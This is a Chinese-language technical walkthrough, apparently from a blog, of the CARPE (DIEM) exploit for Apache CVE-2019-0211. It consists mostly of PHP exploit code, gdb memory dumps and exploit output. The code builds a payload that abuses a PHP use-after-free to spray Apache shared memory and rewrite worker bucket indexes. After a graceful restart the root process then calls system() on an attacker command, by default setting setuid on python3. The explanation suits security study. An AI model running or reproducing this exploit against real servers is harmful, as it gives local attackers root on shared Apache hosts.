先看看payload部署后的效果
    $ curl localhost/carpediem.php
    ...
    PID: 29260
    ...
    Placing payload at address 0x7fe7f593c908
    ...
    Spraying pointer
      Address: 0x7fe7f593c9d8
      From: 0x7fe7f593ca10
      To: 0x7fe7f594d000
      Size: 0x105f0
      Covered: 0x105f0
      Apache: 0xe3000
    ...
    root# gdb attach 29260
    # zend_object.properties->arData
    # | zend_object.properties, arData | = 0x10
    $ x /19xg 0x7fe7f593c908 
    0x7fe7f593c908: 0x732b20646f6d6863  0x69622f7273752f20
    0x7fe7f593c918: 0x6e6f687479702f6e  0x0000000000362e33
    0x7fe7f593c928: 0x0000000000000000  0x0000000000000000
    0x7fe7f593c938: 0x0000000000000000  0x0000000000000000
    0x7fe7f593c948: 0x0000000000000000  0x0000000000000000
    0x7fe7f593c958: 0x0000000000000000  0x0000000000000000
    0x7fe7f593c968: 0x0000000000000000  0x0000000000000000
    0x7fe7f593c978: 0x0000000000000000  0x0000000000000000
    0x7fe7f593c988: 0x0000000000000000  0x0000000000000000
    0x7fe7f593c998: 0x0000000000000000
    $ x /1bs 0x7fe7f593c908
    0x7fe7f593c908: "chmod +s /usr/bin/python3.6"
    # prefork_child_bucket.mutext->meth
    gdb-peda$ x /7xg 0x7fe7f593c908+152
    0x7fe7f593c9a0: 0x0000000000000000  0x0000000000000000
    0x7fe7f593c9b0: 0x0000000000000000  0x0000000000000000
    0x7fe7f593c9c0: 0x0000000000000000  0x0000000000000000
    0x7fe7f593c9d0: 0x00007fe7f1cbafb0
    gdb-peda$ p zend_object_std_dtor
    $1 = {} 0x7fe7f1cbafb0 
    # zend_object.properties 
    gdb-peda$ x /7xg (0x7fe7f593c908+152+8*7)
    0x7fe7f593c9d8: 0x0000000000000001  0x00007fe7f593c9a0
    0x7fe7f593c9e8: 0x00007fe7f593c908  0x0000000000000001
    0x7fe7f593c9f8: 0x0000000000000000  0x0000000000000000
    0x7fe7f593ca08: 0x00007fe7f4ba7440
    gdb-peda$ p system
    $2 = {int (const char *)} 0x7fe7f4ba7440 
    # sprayed area
    gdb-peda$ x /10xg 0x7fe7f593ca10
    0x7fe7f593ca10: 0x00007fe7f593c9d8  0x00007fe7f593c9d8
    0x7fe7f593ca20: 0x00007fe7f593c9d8  0x00007fe7f593c9d8
    0x7fe7f593ca30: 0x00007fe7f593c9d8  0x00007fe7f593c9d8
    0x7fe7f593ca40: 0x00007fe7f593c9d8  0x00007fe7f593c9d8
    0x7fe7f593ca50: 0x00007fe7f593c9d8  0x00007fe7f593c9d8
    gdb-peda$ x /10xg 0x7fe7f594d000-10*8
    0x7fe7f594cfb0: 0x00007fe7f593c9d8  0x00007fe7f593c9d8
    0x7fe7f594cfc0: 0x00007fe7f593c9d8  0x00007fe7f593c9d8
    0x7fe7f594cfd0: 0x00007fe7f593c9d8  0x00007fe7f593c9d8
    0x7fe7f594cfe0: 0x00007fe7f593c9d8  0x00007fe7f593c9d8
    0x7fe7f594cff0: 0x00007fe7f593c9d8  0x00007fe7f593c9d8
payload构造代码  
可以对照上一节的调试信息来看
        # 一个全0的八字节占位符，用于占据结构体指针字段的位置
        $z = ptr2str(0);
    ...
        # 构造payload的152字节，是具体要执行的命令
        $bucket = isset($_REQUEST['cmd']) ?
            $_REQUEST['cmd'] :
            "chmod +s /usr/bin/python3.5";
    ...
        $bucket = str_pad($bucket, $size_worker_score - 112, "x00");
        # 构造 apr_proc_mutex_unix_lock_methods_t
        # 即prefork_child_bucket.mutex->meth
        # 把meth->child_init函数修改为了zend_object_std_dtor
        $meth = 
            $z .
            $z .
            $z .
            $z .
            $z .
            $z .
            # child_init
            ptr2str($addresses['zend_object_std_dtor'])
        ;
        # 这个是作者很巧妙的一个设计，            
        # 由于可以喷射内存区域并不大，所以作者没有喷射完整的结构体，
        # 而是喷射了properties的地址，
        # 并让prefork_child_bucket.mutex
        # 指向的结构体(apr_proc_mutex_t)
        # 和zend_object.properties指向的结构体(HashTable)
        # 共享properties这块内存。
        # 最后的效果见下文。
        $properties = 
            # refcount
            ptr2str(1) .
            # u-nTableMask meth
            ptr2str($payload_start + strlen($bucket)) .
            # Bucket arData
            ptr2str($payload_start) .
            # uint32_t nNumUsed;
            ptr2str(1, 4) .
            # uint32_t nNumOfElements;
            ptr2str(0, 4) .
            # uint32_t nTableSize
            ptr2str(0, 4) .
            # uint32_t nInternalPointer
            ptr2str(0, 4) .
            # zend_long nNextFreeElement
            $z .
            # dtor_func_t pDestructor
            ptr2str($addresses['system'])
        ;
        $payload =
            $bucket .
            $meth .
            $properties
        ;
相关结构体和函数参考(可跳过)：
    php-7.2.13/Zend/zend_types.h
    zend_object
    typedef struct _zend_object     zend_object;
    struct _zend_object {
        zend_refcounted_h gc;           //  8字节
        uint32_t          handle; 
        zend_class_entry *ce;
        const zend_object_handlers *handlers;
        HashTable        *properties;
        zval              properties_table[1];
    };
    zend_object.properties
    typedef struct _zend_array HashTable;
    struct _zend_array {
        zend_refcounted_h gc;  // 8字节
        union {                    
            struct {
                ZEND_ENDIAN_LOHI_4(
                    zend_uchar    flags,
                    zend_uchar    nApplyCount,
                    zend_uchar    nIteratorsCount,
                    zend_uchar    consistency)
            } v;
            uint32_t flags;
        } u;
        uint32_t          nTableMask;
        Bucket           *arData;
        uint32_t          nNumUsed;
        uint32_t          nNumOfElements;
        uint32_t          nTableSize;
        uint32_t          nInternalPointer;
        zend_long         nNextFreeElement;
        dtor_func_t       pDestructor;
    };
    typedef struct _Bucket {
        zval              val;
        zend_ulong        h;                
        zend_string      *key;              
    } Bucket;
    typedef struct _zval_struct     zval;
    struct _zval_struct {
        zend_value        value;            /* value */
        union {
            struct {
                ZEND_ENDIAN_LOHI_4(
                    zend_uchar    type,         /* active type */
                    zend_uchar    type_flags,
                    zend_uchar    const_flags,
                    zend_uchar    reserved)     /* call info for EX(This) */
            } v;
            uint32_t type_info;
        } u1;
        union {
            uint32_t     next;                 /* hash collision chain */
            uint32_t     cache_slot;           /* literal cache slot */
            uint32_t     lineno;               /* line number (for ast nodes) */
            uint32_t     num_args;             /* arguments number for EX(This) */
            uint32_t     fe_pos;               /* foreach position */
            uint32_t     fe_iter_idx;          /* foreach iterator index */
            uint32_t     access_flags;         /* class constant access flags */
            uint32_t     property_guard;       /* single property guard */
            uint32_t     extra;                /* not further specified */
        } u2;
    };
    prefork_child_bucket.mutex->meth
    struct apr_proc_mutex_unix_lock_methods_t {
        unsigned int flags;
        apr_status_t (*create)(apr_proc_mutex_t *, const char *);
        apr_status_t (*acquire)(apr_proc_mutex_t *);
        apr_status_t (*tryacquire)(apr_proc_mutex_t *);
        apr_status_t (*timedacquire)(apr_proc_mutex_t *, apr_interval_time_t);
        apr_status_t (*release)(apr_proc_mutex_t *);
        apr_status_t (*cleanup)(void *);
        apr_status_t (*child_init)(apr_proc_mutex_t **, apr_pool_t *, const char *);
        apr_status_t (*perms_set)(apr_proc_mutex_t *, apr_fileperms_t, apr_uid_t, apr_gid_t);
        apr_lockmech_e mech;
        const char *name;
    }
    struct apr_proc_mutex_t {
        apr_pool_t *pool;
        const apr_proc_mutex_unix_lock_methods_t *meth; bucket)
    $size_prefork_child_bucket = 24;
    $size_worker_score = 264;
    $spray_size = $size_worker_score * (256 - sizeof($workers_pids) * 2);
    $spray_max = $addresses['shm'][1];
    $spray_min = $spray_max - $spray_size;
    $spray_middle = (int) (($spray_min + $spray_max) / 2);
    $bucket_index_middle = (int) (
      - ($all_buckets - $spray_middle) /
      $size_prefork_child_bucket
    );
    $payload_start = $spray_min - $size_worker_score;
将payload写入worker进程SHM空闲区域
    o('Placing payload at address 0x' . dechex($payload_start));
    $p = $payload_start - $address;
    for(
      $i = 0;
      $i abc[$p+$i] = $payload[$i];
    }
堆喷射payload中properties的地址
    for(
      $i = $spray_min;
      $i abc在内存中的地址
      $this->abc[$i - $address] = $s_properties_address[$i % 8];
    }
    o('');
修改每个worker进程的bucket(ap_scoreboard_image->parent[i]->bucket)  
ap_scoreboard_image->parent数组位于SHM 0x20偏移处
    $ sudo cat  /proc/26053/maps|grep rw-s
    7f5dbef6a000-7f5dbef7e000 rw-s 00000000 00:01 220623                     /dev/zero (deleted)
    (gdb) p &ap_scoreboard_image->parent[0]
    $4 = (process_score *) 0x7f5dbef6a020
    (gdb) p ap_scoreboard_image->parent[0]
    $3 = {pid = 26053, generation = 0, quiescing = 0 '00', not_accepting = 0 '00', connections = 0, write_completion = 0, 
      lingering_close = 0, keep_alive = 0, suspended = 0, bucket = -27764}
    # Iterate over every process_score structure until we find every PID or
    # we reach the end of the SHM
    for(
        $p = $addresses['shm'][0] + 0x20;
        $p  0;
        $p += 0x24
    )
    {
        $l = $p - $address;
        $current_pid = str2ptr($this->abc, $l, 4);
        o('Got PID: ' . $current_pid);
        # The PID matches one of the workers
        if(in_array($current_pid, $workers_pids))
        {
            unset($workers_pids[$current_pid]);
            o('  PID matches');
            # Update bucket address
            $s_bucket_index = pack('l', $bucket_index);
            $this->abc[$l + 0x20] = $s_bucket_index[0];
            $this->abc[$l + 0x21] = $s_bucket_index[1];
            $this->abc[$l + 0x22] = $s_bucket_index[2];
            $this->abc[$l + 0x23] = $s_bucket_index[3];
            o('  Changed bucket value to ' . $bucket_index);
            $min = $spray_min - $size_prefork_child_bucket * $bucket_index;
            $max = $spray_max - $size_prefork_child_bucket * $bucket_index;
            o('  Ranges: 0x' . dechex($min) . ' - 0x' . dechex($max));
            # This bucket range is covered, go to the next one
            $bucket_index += $spray_nb_buckets;
        }
    }
4.等待Apache graceful restart  
效果演示：
    root# ps -aux|grep apache
    root      30073  ... /usr/sbin/apache2 -k start
    www-data  30074  ... /usr/sbin/apache2 -k start
    $ curl localhost/carpediem.php
    CARPE (DIEM) ~ CVE-2019-0211
    PID: 30074
    Fetching addresses
      zend_object_std_dtor: 0x7f2843e64fb0
      system: 0x7f2846d51440
      libaprX: 0x7f2847312000-0x0x7f2847345000
      libaprR: 0x7f2847545000-0x0x7f2847546000
      shm: 0x7f2847ae3000-0x0x7f2847af7000
      apache: 0x7f2847af7000-0x0x7f2847c0b000
    Obtaining apache workers PIDs
      Found apache worker: 30074
    Got 1 PIDs.
    Triggering UAF
      Creating room and filling empty spaces
      Allocating $abc and $p
      Unsetting both variables and setting $protector
      Creating DateInterval object
    UAF successful.
    Address of $abc: 0x7f283f29a4e8
    Looking for all_buckets in memory
      [&mutex]: 0x7f2847b501e0
        [mutex]: 0x7f2847b50330
          [meth]: 0x7f2847545b60
            [*]: 0x7f284732d0d0
            [*]: 0x7f284732d070
            [*]: 0x7f284732d010
            [*]: 0x7f284732cfb0
            [*]: 0x7f284732cb30
            [*]: 0x7f284732c810
            [*]: 0x7f284732cf40
    all_buckets = 0x7f2847b501d0
    Computing potential bucket indexes and addresses
    Placing payload at address 0x7f2847ae6908
    Spraying pointer
      Address: 0x7f2847ae69d8
      From: 0x7f2847ae6a10
      To: 0x7f2847af7000
      Size: 0x105f0
      Covered: 0x105f0
      Apache: 0x114000
    Iterating in SHM to find PIDs...
    Got PID: 30074